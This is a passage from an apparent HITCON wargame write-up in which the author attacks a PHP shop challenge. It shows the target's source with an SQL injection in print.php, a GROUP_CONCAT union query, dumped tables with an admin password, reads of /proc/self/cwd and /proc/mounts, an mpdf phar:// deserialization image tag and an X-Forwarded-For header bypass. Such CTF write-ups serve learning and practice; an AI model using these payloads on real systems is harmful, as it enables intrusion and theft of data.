    <span class="token variable">$algo</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token operator">-></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'value'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token variable">$algo</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">get_timezone</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token function">get_pdo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT `value` FROM options WHERE `key` = 'timezone' LIMIT 1"</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">FETCH_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token operator">-></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$row</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$pdo</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"INSERT INTO options VALUES ('timezone', 'Asia/Taipei')"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$timezone</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Asia/Taipei'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$timezone</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'value'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token variable">$timezone</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'TIMEZONE'</span><span class="token punctuation">,</span> <span class="token function">get_timezone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">date_default_timezone_set</span><span class="token punctuation">(</span><span class="token constant">TIMEZONE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function-definition function">endsWith</span><span class="token punctuation">(</span> <span class="token variable">$haystack</span><span class="token punctuation">,</span> <span class="token variable">$needle</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span> <span class="token variable">$needle</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token variable">$length</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token function">substr</span><span class="token punctuation">(</span> <span class="token variable">$haystack</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token variable">$length</span> <span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token variable">$needle</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">function</span> <span class="token function-definition function">order_status_to_text</span><span class="token punctuation">(</span><span class="token variable">$status</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$text_arr</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token constant">ORDER_STATUS_PICKING</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'撿貨'</span><span class="token punctuation">,</span>
        <span class="token constant">ORDER_STATUS_PACKING</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'包裝中'</span><span class="token punctuation">,</span>
        <span class="token constant">ORDER_STATUS_SENDING</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'等待貨運士取貨'</span><span class="token punctuation">,</span>
        <span class="token constant">ORDER_STATUS_DELIVERING</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'配送中'</span><span class="token punctuation">,</span>
        <span class="token constant">ORDER_STATUS_ARRIVED</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'貨物已送達'</span><span class="token punctuation">,</span>
        <span class="token constant">ORDER_STATUS_FINISH</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'完成'</span>
    <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$text_arr</span><span class="token punctuation">[</span><span class="token variable">$status</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Next, I looked at each file and found that <code>print.php</code> had an obvious SQL Injection:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'include.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'third_party/vendor/autoload.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//require_once('rate_limit.php');</span>
<span class="token comment">// rate limit is not working, use random sleep as a workaround</span>
<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token function">random_int</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$is_from_print</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>

<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">get_get_param</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sig</span> <span class="token operator">=</span> <span class="token function">get_get_param</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sig'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sig_hash</span> <span class="token operator">=</span> <span class="token function">get_sig_hash</span><span class="token punctuation">(</span><span class="token variable">$sig</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token function">get_pdo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"
    SELECT *
    FROM orders 
    WHERE sig_hash = '<span class="token interpolation"><span class="token variable">$sig_hash</span></span>' AND id = <span class="token interpolation"><span class="token variable">$id</span></span>
    LIMIT 1
"</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">FETCH_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$order</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token operator">-></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Error</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$order</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pdf.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$html</span> <span class="token operator">=</span> <span class="token function">ob_get_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$mpdf</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Mpdf<span class="token punctuation">\</span>Mpdf</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
    <span class="token string single-quoted-string">'tempDir'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'/tmp'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'autoScriptToLang'</span> <span class="token operator">=></span> <span class="token constant boolean">true</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'autoLangToFont'</span> <span class="token operator">=></span> <span class="token constant boolean">true</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'mode'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'utf-8'</span>
<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$mpdf</span><span class="token operator">-></span><span class="token function">SetTitle</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'收據明細'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$mpdf</span><span class="token operator">-></span><span class="token function">SetSubject</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'收據明細'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$mpdf</span><span class="token operator">-></span><span class="token function">SetAuthor</span><span class="token punctuation">(</span><span class="token function">random_str</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">random_int</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$mpdf</span><span class="token operator">-></span><span class="token function">SetCreator</span><span class="token punctuation">(</span><span class="token function">random_str</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">random_int</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$mpdf</span><span class="token operator">-></span><span class="token function">WriteHTML</span><span class="token punctuation">(</span><span class="token variable">$html</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$mpdf</span><span class="token operator">-></span><span class="token function">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>After manually injecting, the following information was obtained:</p>
<pre class="line-numbers language-none"><code class="language-none">table: rate_limit
ip,last_visit,visit_times

table: items
id,title,description

table: options
key,value

table: backend_users
id,username,password,description
admin u&#x3D;479_p5jV:Fsq(2

table: orders
id,name,email,phone,status,sig_hash,order_date,address,note<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Since only one row of data can be obtained, <code>GROUP_CONCAT</code> can be used to dump data, like this: <code>SELECT 1,GROUP_CONCAT(note),GROUP_CONCAT(name),GROUP_CONCAT(email),5,6,7,8,9 FROM orders </code><br>The third flag (yes, the third, not the second) and a set of credentials were found in the <code>backend_users</code> section of the database, which may be useful later.</p>
<p>According to <code>include.php</code>, we got this path: <code>third_party/vendor/autoload.php</code>. It was obvious that composer was used, so we could read <code>/proc/self/cwd/third_party/composer.json</code> to find out that only one package called <code>mpdf</code> was used.</p>
<p>Next, let’s search for known vulnerabilities. We found an issue reported by DEVCORE on the official website: <a target="_blank" rel="noopener" href="https://github.com/mpdf/mpdf/issues/1381">phar:&#x2F;&#x2F; deserialization and weak randomness of temporary file name may lead to RCE</a></p>
<p>From this issue, we can learn two things:</p>
<ol>
<li>We can write files to <code>/tmp/mpf/_tempCSSidataX_0.jpeg</code></li>
<li>We can use <code>&lt;img src=&quot;#1.jpeg&quot; ORIG_SRC=&quot;phar://../vendor/mpdf/mpdf/tmp/mpdf/_tempCSSidata1_0.jpeg/a.jpg&quot;&gt;&lt;/img&gt;</code> to perform deserialization</li>
</ol>
<p>However, the problem is that we need to find a gadget that can be used to trigger the attack by deserialization. After installing the same package locally, I directly searched for methods starting with <code>__</code> in the <code>third_party</code> folder, but only found some useless things. I couldn’t think of a POP attack chain.</p>
<p>So I got stuck.</p>
<p>I thought and looked at it repeatedly, except for the possibility of exploiting the phar vulnerability, the only other thing is the part in <code>include.php</code> that imports <code>$_SESSION[&#39;lang&#39;]</code>. If we can control <code>lang</code>, we can import any file, but the problem is that there is no vulnerability in <code>lang.php</code> that can be exploited to control parameters, unless we can directly modify <code>/tmp/sess_XXX</code>, otherwise we can’t get in.</p>
<p>But the only vulnerability that can write files is in mpdf, but the file name is restricted and cannot be written anywhere, otherwise the two can be combined.</p>
<p>There is also a strange place that I can’t figure out. I hacked into a set of backend account passwords in the DB, but there should be a backend, where is it?</p>
<p>Usually, when doing this kind of wargame or CTF, enumeration is not necessary, but because I really have no clue, I had to start searching. I used ffuf to scan any place that I thought might be possible, but I got nothing, so I had no clue and didn’t know what to do next.</p>
<p>The wargame started at 9 am on Saturday, and I solved the first two flags at 10 am, and then I got stuck all day. That night, I checked and found that only 6 people had solved it, but there were many NFTs, so I asked in the chat room if there were any plans to release some hints if the solving situation was not as expected. Later, I got a reply asking what kind of information I needed.</p>
<p>Because the solving time was set to be until 6 pm on Sunday (the end of HITCON), I thought I would wait until it was over to ask for hints, which explained my situation (solved 1 and 3 and got stuck). Later, I got a reply saying to observe vulnerability 1 again to see if there is anything like a backend.</p>
<p>So I tried various paths again, and finally tried something I had seen before but had not tried: <code>/proc/mounts</code>, the content looks like this:</p>
<pre class="line-numbers language-none"><code class="language-none">overlay &#x2F; overlay rw,relatime,lowerdir&#x3D;&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;DVIDOZY6PBLWVCFYWII5AAUIJZ:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;3CV53MMJRHWIZWOHD5WPBJANGZ:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;VIRCM74GAO2ULIS6SHAVLYHI7O:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;QC5SROY6OOIX6VQUNGJG3T5GMY:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;3Z7BTZXFISPKXE3DEG4OUPAB5G:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;GDBX5T35WQSMHIY2USJLX6SPRU:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;WHFI4IRDVNIOO6MLKCKKAMYQKB:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;JLXT6H6QNKB45UIDZANGKVGLPD:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;M756SQ7NRKEJCKLHPB2PRKG5Z2:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;OY2PWIL6ISIIORC7LZNWWQ6JKN:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;GXC3IEBX7YVRSOMH34OAE6Y5LV:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;FNJ3ZWM4WCOCANHBZPBTO47K5B:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;NRVSBMR3SAZ3PNE5KXGMUQMODK:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;2MARFWCP5GVEAG5IBUMLJTABKL:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;F67HXFSPANXFWKRP2R5YJHJRBE:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;AKYB2LUEDDQPLGHVXECL72U4MK:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;B7CFODJXDKC3HEX5ZJD7NAID5A:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;5XQVILRBQTSFRMEKB7YW6UTYLB:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;6ZMT3PTB6QFDZ2PJOURGMQZIMJ:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;4AUQ72KT7D5WLPX3GCGBI576ZS:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;HEF7KMRLHAUNHLXAPU5T4QFJJD:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;ZEPQYM2UZQKKXKJS62CP5RIRKN:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;4BBAOHRGSZ3TVLTD4ZICVZS7C7:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;3K7P7JABJCB4HT5HZRXGBFSSAU:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;GUW5ZGQOABGYH7KF5IU5JFHG6E:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;RKL5CJMH6X7ORW4XAB5HJ3RJ3C:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;ZLWG5Z6C6FD3OQEJCZHJHODTTX:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;QLSXNQZKZQQ3YDAFJ675RXRFWL:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;KHQSPHLSLWASTCLEBPKWK7AABD:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;GCM3GAH2MB2FBUK2NUGCCQ6H6R:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;FVHE6ZGSGB26C3JN35T36U575B:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;A3B3RQ7O6RTEZTZDFCBNL3R2IG:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;VWEM5H2WW7HEKTCLCWBPPEV4RA:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;QAYAOZL2DM73CJVN7Y3J7MRXDP:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;CGI6OQSFKKJRGSKZASWCHJDJIM,upperdir&#x3D;&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;ea857d9fda05b6fb0c5b7d79544f8d05943163aec8ecce2c8aaede2a93bd0b1b&#x2F;diff,workdir&#x3D;&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;ea857d9fda05b6fb0c5b7d79544f8d05943163aec8ecce2c8aaede2a93bd0b1b&#x2F;work 0 0
proc &#x2F;proc proc rw,nosuid,nodev,noexec,relatime 0 0
tmpfs &#x2F;dev tmpfs rw,nosuid,size&#x3D;65536k,mode&#x3D;755 0 0
devpts &#x2F;dev&#x2F;pts devpts rw,nosuid,noexec,relatime,gid&#x3D;5,mode&#x3D;620,ptmxmode&#x3D;666 0 0
sysfs &#x2F;sys sysfs ro,nosuid,nodev,noexec,relatime 0 0
tmpfs &#x2F;sys&#x2F;fs&#x2F;cgroup tmpfs rw,nosuid,nodev,noexec,relatime,mode&#x3D;755 0 0
cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;systemd cgroup ro,nosuid,nodev,noexec,relatime,xattr,name&#x3D;systemd 0 0
cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;freezer cgroup ro,nosuid,nodev,noexec,relatime,freezer 0 0
cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;hugetlb cgroup ro,nosuid,nodev,noexec,relatime,hugetlb 0 0
cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;cpu,cpuacct cgroup ro,nosuid,nodev,noexec,relatime,cpu,cpuacct 0 0
cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;perf_event cgroup ro,nosuid,nodev,noexec,relatime,perf_event 0 0
cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;net_cls,net_prio cgroup ro,nosuid,nodev,noexec,relatime,net_cls,net_prio 0 0
cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;pids cgroup ro,nosuid,nodev,noexec,relatime,pids 0 0
cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;rdma cgroup ro,nosuid,nodev,noexec,relatime,rdma 0 0
cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;blkio cgroup ro,nosuid,nodev,noexec,relatime,blkio 0 0
cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;devices cgroup ro,nosuid,nodev,noexec,relatime,devices 0 0
cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory cgroup ro,nosuid,nodev,noexec,relatime,memory 0 0
cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;cpuset cgroup ro,nosuid,nodev,noexec,relatime,cpuset 0 0
mqueue &#x2F;dev&#x2F;mqueue mqueue rw,nosuid,nodev,noexec,relatime 0 0
shm &#x2F;dev&#x2F;shm tmpfs rw,nosuid,nodev,noexec,relatime,size&#x3D;65536k 0 0
&#x2F;dev&#x2F;sda &#x2F;etc&#x2F;hosts ext4 rw,relatime,errors&#x3D;remount-ro,data&#x3D;ordered 0 0
&#x2F;dev&#x2F;sda &#x2F;etc&#x2F;resolv.conf ext4 rw,relatime,errors&#x3D;remount-ro,data&#x3D;ordered 0 0
&#x2F;dev&#x2F;sda &#x2F;etc&#x2F;hostname ext4 rw,relatime,errors&#x3D;remount-ro,data&#x3D;ordered 0 0
&#x2F;dev&#x2F;sda &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;frontend ext4 ro,relatime,errors&#x3D;remount-ro,data&#x3D;ordered 0 0
&#x2F;dev&#x2F;sda &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;images ext4 rw,relatime,errors&#x3D;remount-ro,data&#x3D;ordered 0 0
&#x2F;dev&#x2F;sda &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;b8ck3nd ext4 ro,relatime,errors&#x3D;remount-ro,data&#x3D;ordered 0 0
&#x2F;dev&#x2F;sda &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;php.ini ext4 ro,relatime,errors&#x3D;remount-ro,data&#x3D;ordered 0 0
proc &#x2F;proc&#x2F;bus proc ro,nosuid,nodev,noexec,relatime 0 0
proc &#x2F;proc&#x2F;fs proc ro,nosuid,nodev,noexec,relatime 0 0
proc &#x2F;proc&#x2F;irq proc ro,nosuid,nodev,noexec,relatime 0 0
proc &#x2F;proc&#x2F;sys proc ro,nosuid,nodev,noexec,relatime 0 0
proc &#x2F;proc&#x2F;sysrq-trigger proc ro,nosuid,nodev,noexec,relatime 0 0
tmpfs &#x2F;proc&#x2F;acpi tmpfs ro,relatime 0 0
tmpfs &#x2F;proc&#x2F;kcore tmpfs rw,nosuid,size&#x3D;65536k,mode&#x3D;755 0 0
tmpfs &#x2F;proc&#x2F;keys tmpfs rw,nosuid,size&#x3D;65536k,mode&#x3D;755 0 0
tmpfs &#x2F;proc&#x2F;timer_list tmpfs rw,nosuid,size&#x3D;65536k,mode&#x3D;755 0 0
tmpfs &#x2F;proc&#x2F;sched_debug tmpfs rw,nosuid,size&#x3D;65536k,mode&#x3D;755 0 0
tmpfs &#x2F;proc&#x2F;scsi tmpfs ro,relatime 0 0
tmpfs &#x2F;sys&#x2F;firmware tmpfs ro,relatime 0 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Inside, you can directly see several important paths:</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;dev&#x2F;sda &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;frontend ext4 ro,relatime,errors&#x3D;remount-ro,data&#x3D;ordered 0 0
&#x2F;dev&#x2F;sda &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;images ext4 rw,relatime,errors&#x3D;remount-ro,data&#x3D;ordered 0 0
&#x2F;dev&#x2F;sda &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;b8ck3nd ext4 ro,relatime,errors&#x3D;remount-ro,data&#x3D;ordered 0 0
&#x2F;dev&#x2F;sda &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;php.ini ext4 ro,relatime,errors&#x3D;remount-ro,data&#x3D;ordered 0 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>Yes, I missed this at the beginning, and it took me a whole day to find it.</p>
<p>After finding this, things became easier. When I entered <code>b8ck3nd/index.php</code>, I was directly redirected to the homepage. I remembered some utils functions I saw in <code>include.php</code> and tried adding <code>X-Forwarded-For: 127.0.0.1</code> to bypass it and go to the login page. The login account and password used the one I got from the SQL injection earlier. After successfully logging in, I got the fourth flag.</p>
<p>Then I found an <code>upload.php</code> in the backend, which can upload any file:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'include.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'GET'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: text/plain'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkZha2UgdG9rZW4gZm9yIGNrZWRpdG9yIiwiaWF0IjoxNTE2MjM5MDIyfQ.6nNLxp10uP65V_NFrs5IWuX2tkk6vGQ-oiwYhHNdHgk'</span><span class="token punctuation">;</span>
